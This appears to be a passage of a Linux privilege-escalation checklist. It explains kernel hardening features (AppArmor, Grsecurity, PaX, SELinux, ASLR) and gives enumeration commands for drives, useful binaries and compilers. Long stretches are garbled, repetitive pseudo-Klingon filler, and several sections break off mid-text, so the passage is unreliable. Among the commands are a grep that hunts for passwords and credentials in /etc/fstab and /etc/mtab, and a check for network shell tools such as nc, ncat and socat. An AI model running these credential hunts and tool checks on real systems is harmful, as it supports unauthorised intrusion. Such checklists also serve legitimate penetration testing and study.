qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'w
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity is a set of security enhancements for the Linux kernel. It provides additional protection against various types of attacks, including privilege escalation. Grsecurity includes features such as address space layout randomization (ASLR), enhanced access control, and process restrictions.

To enable Grsecurity on your Linux system, you need to download and apply the Grsecurity patch to your kernel source code. Once applied, you can compile and install the patched kernel.

Grsecurity provides several security features that can help prevent privilege escalation attacks. Some of these features include:

- Role-based access control (RBAC): RBAC allows you to define fine-grained access control policies for different users and processes. This helps limit the privileges of individual users and reduces the risk of privilege escalation.

- PaX: PaX is a set of security features that includes address space layout randomization (ASLR), which helps prevent buffer overflow attacks by randomizing the memory layout of processes.

- Chroot restrictions: Grsecurity provides enhanced chroot restrictions, which help prevent an attacker from escaping the chroot environment and gaining access to the host system.

- Process restrictions: Grsecurity allows you to define restrictions on individual processes, such as limiting their ability to execute certain system calls or access specific files.

By enabling and configuring these features, you can significantly improve the security of your Linux system and reduce the risk of privilege escalation attacks. However, it's important to note that Grsecurity is a complex tool, and proper configuration and maintenance are crucial to ensure its effectiveness.

For more information on Grsecurity and how to enable and configure its features, refer to the official Grsecurity documentation.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX is a patch for the Linux kernel that provides various security enhancements, including protection against memory corruption vulnerabilities. It works by implementing various memory protection mechanisms, such as Address Space Layout Randomization (ASLR), Non-Executable Pages (NX), and Stack Smashing Protection (SSP).

PaX can be an effective tool for hardening a Linux system against privilege escalation attacks. By preventing attackers from executing arbitrary code or manipulating the memory layout, PaX can significantly reduce the risk of successful privilege escalation.

To enable PaX on a Linux system, you need to apply the PaX patch to the kernel source code and recompile the kernel. Once PaX is enabled, it will enforce the memory protection mechanisms and make it more difficult for attackers to exploit vulnerabilities.

It's important to note that while PaX can enhance the security of a Linux system, it is not a silver bullet. It should be used in conjunction with other security measures, such as regular system updates, strong access controls, and secure coding practices.

Overall, PaX is a valuable tool for hardening a Linux system and reducing the risk of privilege escalation attacks. By implementing memory protection mechanisms, PaX can make it more difficult for attackers to exploit vulnerabilities and gain elevated privileges.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield is a security feature implemented in the Linux kernel that helps protect against certain types of memory-based attacks. It works by randomizing the memory layout of executable programs, making it more difficult for attackers to predict the location of specific functions or data in memory.

Execshield can be enabled by setting the `kernel.exec-shield` parameter to a value of `1` in the `/proc/sys/kernel` file. This can be done using the following command:

```bash
echo 1 > /proc/sys/kernel/exec-shield
```

To check if Execshield is enabled, you can use the following command:

```bash
cat /proc/sys/kernel/exec-shield
```

If the output is `1`, then Execshield is enabled. If the output is `0`, then it is disabled.

It is important to note that while Execshield can provide an additional layer of security, it is not a foolproof solution. It is still important to follow other security best practices, such as keeping your system up to date with the latest security patches and using strong passwords.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

**SElinux** (Security-Enhanced Linux) is a security mechanism implemented in the Linux kernel. It provides an additional layer of access control to enforce mandatory access control (MAC) policies. 

SElinux works by defining security contexts for processes, files, and network connections. These security contexts determine the level of access that is allowed or denied. 

By default, SElinux is enabled on many Linux distributions, including CentOS and Fedora. However, it can be disabled or set to permissive mode, which allows violations to be logged but not enforced. 

SElinux can be a powerful tool for hardening a Linux system, as it can prevent unauthorized access and limit the damage that can be caused by a compromised process. However, it can also be complex to configure and may require additional effort to troubleshoot issues that arise. 

To check the status of SElinux on a system, you can use the `sestatus` command. This will display whether SElinux is enabled, disabled, or in permissive mode. 

To configure SElinux, you can use the `setsebool` command to modify the boolean values that control various aspects of SElinux behavior. You can also use the `semanage` command to manage the SElinux policy, including adding or modifying file contexts. 

It is important to note that SElinux is just one piece of the puzzle when it comes to securing a Linux system. It should be used in conjunction with other security measures, such as strong passwords, regular software updates, and proper user access controls.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) is a security technique used to prevent attackers from predicting the memory addresses of key system components. By randomizing the memory layout, ASLR makes it more difficult for attackers to exploit memory vulnerabilities and execute arbitrary code.

ASLR works by randomly arranging the positions of key system components, such as libraries, stack, and heap, in the memory address space. This makes it challenging for attackers to determine the exact memory addresses they need to target.

To enable ASLR on a Linux system, you can check the current status by running the following command:

```bash
sysctl kernel.randomize_va_space
```

If the output is `2`, ASLR is enabled for all processes. If the output is `0`, ASLR is disabled. To enable ASLR, you can set the value to `2` by running the following command:

```bash
sudo sysctl -w kernel.randomize_va_space=2
```

It's important to note that ASLR is not a foolproof security measure and can be bypassed in certain scenarios. However, it adds an additional layer of protection and makes it more challenging for attackers to exploit memory vulnerabilities.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

If you are inside a docker container you can try to escape from it:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Drives

**Qa'pla'!** **QaStaHvIS** **'ej** **QaStaHvIS** **jatlh** **'e'** **vItlhutlh** **'ej** **nuqneH**. **vaj** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'e'
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## QaStaHvIS software

Enumerate useful binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
**ghItlhvam** **compiler** **yIlo'**. **vaj** **'oH** **ghItlhvam** **kernel exploit** **vaj** **'oH** **yIlo'** **ghItlhvam** **'e'** **yIlo'** **(vaj** **'oH** **'e'** **yIlo'** **ghItlhvam** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **'e'** **yIlo'** **
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

**QaStaHvIS lo'laHbe'chugh je** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI' Nagios version** **(mung) vItlhutlh** **'e' vItlhutlh** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'e' vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun 